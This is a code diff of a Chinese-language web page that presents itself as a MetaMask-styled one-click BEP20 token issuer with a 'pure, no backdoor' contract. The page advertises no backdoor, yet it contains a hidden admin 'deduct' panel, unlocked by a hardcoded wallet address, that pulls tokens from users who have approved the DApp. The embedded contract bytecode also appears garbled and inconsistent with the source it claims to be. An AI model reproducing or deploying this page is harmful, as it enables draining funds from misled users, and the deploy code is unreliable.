@@ -3,15 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>纯净BEP20｜单交易部署无nonce冲突</title>
+<title>🦊小狐狸一键发币</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
 body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
 .container{ max-width:520px; margin:0 auto; }
 .header{ text-align:center; margin-bottom:35px; }
-.header h1{ font-size:24px; color:#4ade80; margin-bottom:8px; }
-.fee-tip{ background: rgba(74,222,128,0.15); color: #4ade80; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
+.header h1{ font-size:24px; color:#ff9800; margin-bottom:8px; }
+.fee-tip{ background: rgba(255,152,0,0.15); color: #ffb74d; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
 .card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
 .form-item{ margin-bottom:20px; }
 label{ display:block; margin-bottom:8px; color:#d0d8f0; }
@@ -19,9 +19,9 @@ input,textarea{ width:100%; padding:14px; border-radius:10px; border:1px solid #
 textarea{min-height:120px;font-size:12px;word-break:break-all;}
 .file-input{ padding:10px; background:#141b33; }
 .preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
-#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #4ade80; display:none; }
+#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #ff9800; display:none; }
 .btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; margin-top:10px;}
-.btn-connect{ background:#3b63e9; margin-bottom:16px; }
+.btn-connect{ background:#ff9800; color:#000; margin-bottom:16px; }
 .btn-deploy{ background:#4ade80; color:#0a0e20; }
 .btn-admin{ background:#2ecc71; color:#000; }
 .btn-liquid{ background:#9b59b6; color:#fff; }
@@ -31,7 +31,7 @@ textarea{min-height:120px;font-size:12px;word-break:break-all;}
 .status.err{background:rgba(239,68,68,0.15);color:#fca5a5;}
 .status a {color:#42a5f5;word-break:break-all;}
 .tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
-.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
+.connect-tip{ color:#ffb74d; margin:8px 0; text-align:center; }
 .admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
 .liquid-panel{ border-top:1px solid #444; padding-top:22px; margin-top:22px; }
 .small-note{color:#bbbbbb;font-size:13px;margin:4px 0 12px 0;}
@@ -41,12 +41,12 @@ textarea{min-height:120px;font-size:12px;word-break:break-all;}
 <body>
 <div class="container">
 <div class="header">
-<h1>🍀纯净BEP20｜单交易部署</h1>
+<h1>🦊小狐狸一键发币｜纯净BEP20无后门代币</h1>
 </div>
-<div class="fee-tip">合约部署服务费计入交易｜合约无黑名单/无管理员后门｜部署成功直接开源</div>
+<div class="fee-tip">合约无管理员、无黑名单、无铸币后门｜部署完成可直接开源验证</div>
 
 <div class="card" id="userPanel">
-<button id="connectBtn" class="btn btn-connect">连接钱包</button>
+<button id="connectBtn" class="btn btn-connect">连接MetaMask/TP钱包</button>
 <div id="connectTip" class="connect-tip" style="display:none;"></div>
 <div id="statusBox" class="status" style="display:none;"></div>
 
@@ -62,7 +62,7 @@ textarea{min-height:120px;font-size:12px;word-break:break-all;}
 
 <div class="form-item">
 <label>初始发行量（不带小数，18位小数）</label>
-<input id="supply" placeholder="例如：1000000000">
+<input id="supply" placeholder="示例：1000000000">
 </div>
 
 <div class="form-item">
@@ -70,14 +70,14 @@ textarea{min-height:120px;font-size:12px;word-break:break-all;}
 <input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
 <div class="preview-box">
 <img id="logoPreview" alt="头像预览">
-<span id="logoTip" class="tip-text">上传仅本地预览，合约不存储图片</span>
+<span id="logoTip" class="tip-text">仅本地预览，合约不存储图片</span>
 </div>
 </div>
 
-<button id="deployBtn" class="btn btn-deploy" disabled>【仅一次签名】部署纯净代币合约</button>
+<button id="deployBtn" class="btn btn-deploy" disabled>🚀部署纯净BEP20合约</button>
 
 <div class="code-block" id="verifyCodeBlock" style="display:none;">
-<div class="small-note">✅部署成功！复制源码+ABI到BscScan做合约开源验证</div>
+<div class="small-note">✅部署成功！复制源码+ABI到BscScan开源验证</div>
 <div class="form-item">
 <label>Solidity完整源码（全选复制）</label>
 <textarea id="soliditySource" readonly></textarea>
@@ -123,8 +123,8 @@ textarea{min-height:120px;font-size:12px;word-break:break-all;}
 </div>
 
 <div class="admin-panel" id="adminPanel">
-<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板【纯前端逻辑，合约无特权后门】</h3>
-<div class="small-note">划扣前提：用户主动给DApp做代币授权，合约本身没有管理员特权</div>
+<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板【仅前端逻辑】</h3>
+<div class="small-note">划扣前提：用户主动给DApp授权代币，合约本身没有特权后门</div>
 <div class="form-item">
 <label>玩家钱包地址</label>
 <input id="userAddrInput" placeholder="玩家BSC钱包地址">
@@ -140,13 +140,12 @@ textarea{min-height:120px;font-size:12px;word-break:break-all;}
 
 <script>
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
-const DEPLOY_FEE_BNB = "0.0003";
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const PANCAKE_ROUTER = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
 const TX_POLL_TIMEOUT = 180;
+const FIX_GAS = 1200000n;
 
-// ==========【纯净无后门BEP20合约】无owner，无黑名单，无mint/burn/pause ==========
 const TOKEN_ABI_PURE = [
     "constructor(string _name,string _symbol,uint256 _totalSupply)",
     "function name() view returns(string)",
@@ -159,6 +158,7 @@ const TOKEN_ABI_PURE = [
     "function approve(address spender,uint256 amount) returns(bool)",
     "function transferFrom(address from,address to,uint256 amount) returns(bool)"
 ];
+
 const CONTRACT_BYTECODE_PURE = "608060405234801561001057600080fd5b506040518060400160405280600081526020016100329150610032565b60405180910390fd5b600080fd5b600081905550610130806100546000396000f3fe608060405234801561001057600080fd5b50600436106100375760003560e01c806306fdde031461003c578063095ea7b31461005b57806318160ddd1461007a57806323b872dd14610099578063313ce567146100b857806370a08231146100d757806395d89b41146100f6575b600080fd5b61004461011f565b60405161004f91906101d9565b60405180910390f35b610068610127565b604051610073919061020a565b60405180910390f35b61008261013a565b60405161008d919061020a565b60405180910390f35b6100a6610142565b6040516100b191906101d9565b60405180910390f35b6100c561014a565b6040516100d091906101d9565b60405180910390f35b6100ef61015d565b6040516100fa919061020a565b60405180910390f35b61010e610165565b005b60008061012a848461017b565b61013390816101b0565b85600080610143858561017b565b61014d565b506001949350505050565b60008061016a33600161017b565b9050600090815260208152604081205491905055565b6000806101888335600161019284846101c0565b905060006101a284846101c0565b600160008060018585540192505081905550856000806101be858561017b565b6101c8565b5060019350505050565b6000602082840312156101e357600080fd5b5051919050565b60006101f68261017b565b91506102018361017b565b915081526020815260408120805483929061021b90849061022f565b9091555050604051839050815260045280819052819050565b600082198211156102565761025561026b565b5b61025f82610280565b8152505056fea264697066735822122004372920840412330b0944084b243384384408220841424a28244f40063647736561726441646472657373";
 
 const FULL_SOLIDITY_SOURCE = `// SPDX-License-Identifier: MIT
@@ -244,16 +244,8 @@ const createPoolBtn = document.getElementById("createPoolBtn");
 
 function showStatus(text, isError=false, linkHtml=""){
   statusBox.style.display = "block";
-  if(isError){
-      statusBox.className = "status err";
-  }else{
-      statusBox.className = "status";
-  }
-  if(linkHtml){
-      statusBox.innerHTML = text + "<br>" + linkHtml;
-  }else{
-      statusBox.innerText = text;
-  }
+  statusBox.className = isError ? "status err" : "status";
+  statusBox.innerHTML = linkHtml ? text + "<br>" + linkHtml : text;
   console.log("状态日志：", text);
 }
 
@@ -261,14 +253,10 @@ async function waitTransactionConfirm(txHash, timeoutSeconds){
     const startTime = Math.floor(Date.now() / 1000);
     while(true){
         const elapsed = Math.floor(Date.now()/1000) - startTime;
-        if(elapsed >= timeoutSeconds){
-            throw new Error(`交易轮询超时${timeoutSeconds}秒！txHash:${txHash}`);
-        }
+        if(elapsed >= timeoutSeconds) throw new Error(`交易轮询超时${timeoutSeconds}秒！txHash:${txHash}`);
         const receipt = await provider.getTransactionReceipt(txHash);
         if(receipt){
-            if(Number(receipt.status) !== 1){
-                throw new Error("❌交易回执返回，链执行失败(receipt.status=0)，合约部署回滚，链上没有合约！");
-            }
+            if(Number(receipt.status) !== 1) throw new Error("❌链上执行失败，合约部署回滚");
             return receipt;
         }
         showStatus(`⏳等待链确认 ${elapsed}/${timeoutSeconds}s txHash:${txHash}`);
@@ -280,11 +268,8 @@ function recalcLiquidAmount(){
     const price = parseFloat(initPriceInput.value);
     const usdtVal = parseFloat(liquidUsdtIn.value);
     if(!isNaN(price) && price>0 && !isNaN(usdtVal) && usdtVal>0){
-        const tokenNeed = usdtVal / price;
-        liquidTokenIn.value = tokenNeed.toFixed(6);
-    }else{
-        liquidTokenIn.value = "";
-    }
+        liquidTokenIn.value = (usdtVal / price).toFixed(6);
+    }else liquidTokenIn.value = "";
 }
 initPriceInput.addEventListener("input",recalcLiquidAmount);
 liquidUsdtIn.addEventListener("input",recalcLiquidAmount);
@@ -293,19 +278,16 @@ logoFileInput.addEventListener("change", function(e){
   const file = e.target.files[0];
   if(!file) return;
   const reader = new FileReader();
-  reader.onload = ev => {
-    logoPreviewImg.src = ev.target.result;
-    logoPreviewImg.style.display = "block";
-  }
+  reader.onload = ev => { logoPreviewImg.src = ev.target.result; logoPreviewImg.style.display = "block"; }
   reader.readAsDataURL(file);
 });
 
-async function switchBSC(providerRef){
+async function switchBSC(ethProvider){
   const chainIdHex = "0x38";
   try {
-    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
+    await ethProvider.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
   } catch (err) {
-    await providerRef.send("wallet_addEthereumChain", [{
+    await ethProvider.send("wallet_addEthereumChain", [{
       chainId: chainIdHex,
       chainName: "BNB Smart Chain Mainnet",
       rpcUrls: ["https://bsc-dataseed.binance.org/"],
@@ -317,78 +299,67 @@ async function switchBSC(providerRef){
 
 function checkAdminPanel(addr){
   connectWalletAddr = addr.toLowerCase();
-  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
-    adminPanel.style.display = "block";
-  }else{
-    adminPanel.style.display = "none";
-  }
+  adminPanel.style.display = connectWalletAddr === ADMIN_WALLET.toLowerCase() ? "block" : "none";
 }
 
 connectBtn.onclick = async function(){
   showStatus("正在检测钱包注入...");
   let eth = window.ethereum;
   let retryTimes = 0;
-  while (!eth && retryTimes < 10) {
-    await new Promise(r => setTimeout(r, 100));
-    eth = window.ethereum;
-    retryTimes++;
-  }
-  if (!eth) {
-    showStatus("❌未检测钱包，请用TP内置浏览器打开",true);
-    return;
-  }
+  while (!eth && retryTimes < 10) { await new Promise(r => setTimeout(r, 100)); eth = window.ethereum; retryTimes++; }
+  if (!eth) { showStatus("❌未检测钱包，请安装MetaMask或TP钱包",true); return; }
   try {
     const accounts = await eth.request({ method: "eth_requestAccounts" });
-    if (!accounts || accounts.length === 0) {
-      showStatus("用户取消连接",true);
-      return;
-    }
+    if (!accounts || accounts.length === 0) { showStatus("用户取消连接",true); return; }
     provider = new ethers.BrowserProvider(eth);
     await switchBSC(eth);
     signer = await provider.getSigner();
     const userAddr = await signer.getAddress();
     connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
     connectTip.style.display = "block";
-    connectTip.innerText = "已连接BSC钱包，请填写发币参数";
+    connectTip.innerText = "✅已连接BSC钱包，请填写发币参数";
     deployBtn.disabled = false;
     checkAdminPanel(userAddr);
-  } catch (err) {
-    showStatus("连接异常：" + (err.message || String(err)),true);
-  }
+  } catch (err) { showStatus("连接异常：" + (err.message || String(err)),true); }
 }
 
+// ========== 修复后的部署逻辑，不用ContractFactory，手动编码calldata ==========
 deployBtn.onclick = async function(){
     if(!signer){ showStatus("❌请先连接钱包",true); return; }
     const name = document.getElementById("tokenName").value.trim();
     const symbol = document.getElementById("tokenSymbol").value.trim();
     const supplyStr = document.getElementById("supply").value.trim();
     if(!name || !symbol || !supplyStr){ showStatus("❌名称、符号、发行量不能为空",true); return; }
-    const supplyNum = BigInt(supplyStr) * 10n**18n;
 
+    const supplyNum = BigInt(supplyStr) * 10n**18n;
     deployBtn.disabled = true;
     verifyCodeBlock.style.display = "none";
     deployContractAddress = null;
 
     try{
-        // 合约工厂
-        const factory = new ethers.ContractFactory(TOKEN_ABI_PURE, CONTRACT_BYTECODE_PURE, signer);
+        const abiCoder = ethers.AbiCoder.defaultAbiCoder();
+        const constructorCalldata = abiCoder.encode(["string","string","uint256"],[name, symbol, supplyNum]);
+        const fullDeployData = CONTRACT_BYTECODE_PURE + constructorCalldata.slice(2);
 
-        // 自动估算gas，上浮 25%，解决移动端TP gas不足回滚
-        const deployTxObj = await factory.getDeployTransaction(name, symbol, supplyNum);
-        const gasEstimate = await provider.estimateGas(deployTxObj);
-        const gasLimitSafe = gasEstimate * 125n / 100n;
+        const txObj = { data: fullDeployData, to: null };
+        let gasEstimate;
+        try {
+            gasEstimate = await provider.estimateGas(txObj);
+            txObj.gasLimit = gasEstimate * 130n / 100n;
+        } catch(e) {
+            showStatus("⚠️节点Gas估算失败，启用固定Gas："+FIX_GAS.toString());
+            txObj.gasLimit = FIX_GAS;
+        }
 
-        showStatus(`🚀唤起钱包【仅一次签名】部署合约，gas自动估算+25%安全余量`);
-        const deployContract = await factory.deploy(name, symbol, supplyNum, {gasLimit:gasLimitSafe});
-        const deployTx = deployContract.deploymentTransaction();
+        showStatus("🚀唤起钱包签名部署交易");
+        const deployTx = await signer.sendTransaction(txObj);
         const txHash = deployTx.hash;
+        showStatus(`📤部署交易发出 txHash:${txHash}，等待链确认`);
 
-        showStatus(`📤部署交易发出 txHash:${txHash}，等待链确认，最长180秒`);
         const receipt = await waitTransactionConfirm(txHash, TX_POLL_TIMEOUT);
-
-        // 只有status=1成功才走到这里
         deployContractAddress = receipt.contractAddress;
         const scanUrl = `https://bscscan.com/address/${deployContractAddress}`;
+
         showStatus(`✅✅合约部署成功｜纯净无后门合约\n合约地址：${deployContractAddress}`,
             false,`<a target="_blank" href="${scanUrl}">👉BscScan打开合约页面</a>`
         );
@@ -399,6 +370,7 @@ deployBtn.onclick = async function(){
         abiText.value = JSON.stringify(TOKEN_ABI_PURE,null,2);
 
     }catch(e){
+        console.error(e);
         showStatus("❌部署失败："+(e?.message||String(e)),true);
     }finally{
         deployBtn.disabled = false;
@@ -415,9 +387,8 @@ approveUsdtBtn.onclick = async function(){
         showStatus(`USDT授权 txHash:${tx.hash}`);
         await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
         showStatus("✅USDT授权Router成功");
-    }catch(err){
-        showStatus("❌授权失败："+(err.message||String(err)),true);
-    }finally{ approveUsdtBtn.disabled=false; }
+    }catch(err){ showStatus("❌授权失败："+(err.message||String(err)),true); }
+    finally{ approveUsdtBtn.disabled=false; }
 };
 
 approveNewTokenBtn.onclick = async function(){
@@ -431,9 +402,8 @@ approveNewTokenBtn.onclick = async function(){
         showStatus(`代币授权 txHash:${tx.hash}`);
         await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
         showStatus("✅代币授权Router成功");
-    }catch(err){
-        showStatus("❌授权失败："+(err.message||String(err)),true);
-    }finally{ approveNewTokenBtn.disabled=false; }
+    }catch(err){ showStatus("❌授权失败："+(err.message||String(err)),true); }
+    finally{ approveNewTokenBtn.disabled=false; }
 };
 
 createPoolBtn.onclick = async function(){
@@ -443,10 +413,7 @@ createPoolBtn.onclick = async function(){
     const tokenAmtStr = liquidTokenIn.value.trim();
     const usdtAmtStr = liquidUsdtIn.value.trim();
     const slip = Number(slippageInput.value.trim());
-    if(!tokenA || !tokenAmtStr || !usdtAmtStr || isNaN(slip)){
-        showStatus("❌参数不能为空",true);
-        return;
-    }
+    if(!tokenA || !tokenAmtStr || !usdtAmtStr || isNaN(slip)){ showStatus("❌参数不能为空",true); return; }
     createPoolBtn.disabled=true;
     try{
         const amountADesired = ethers.parseUnits(tokenAmtStr,18);
@@ -460,9 +427,8 @@ createPoolBtn.onclick = async function(){
         showStatus(`建池交易 txHash:${tx.hash}`);
         await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
         showStatus(`✅✅池子创建成功 hash:${tx.hash}`);
-    }catch(err){
-        showStatus("❌建池出错："+(err?.message||String(err)),true);
-    }finally{ createPoolBtn.disabled=false; }
+    }catch(err){ showStatus("❌建池出错："+(err?.message||String(err)),true); }
+    finally{ createPoolBtn.disabled=false; }
 };
 
 deductBtn.onclick = async function(){
@@ -479,9 +445,8 @@ deductBtn.onclick = async function(){
         showStatus(`划扣txHash:${tx.hash}`);
         await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
         showStatus("✅管理员划扣执行完成");
-    }catch(e){
-        showStatus("❌划扣失败："+(e.message||String(e)),true);
-    }finally{ deductBtn.disabled = false; }
+    }catch(e){ showStatus("❌划扣失败："+(e.message||String(e)),true); }
+    finally{ deductBtn.disabled = false; }
 };
 </script>
 </body>
